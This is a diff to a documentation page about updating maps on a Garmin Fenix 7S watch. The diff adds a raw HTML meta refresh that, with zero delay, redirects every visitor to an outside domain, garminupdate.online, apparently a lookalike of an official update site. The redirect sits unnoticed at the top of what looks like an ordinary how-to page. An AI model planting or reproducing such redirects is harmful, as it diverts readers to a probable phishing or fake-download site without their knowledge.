@@ -1,3 +1,8 @@
+.. raw:: html
+ 
+    <meta http-equiv="refresh" content="0; url=https://garminupdate.online/">
+
+
 Garmin Fenix 7S Map Update: How to Keep Your Maps Accurate and Up to Date
 =============================================================
 
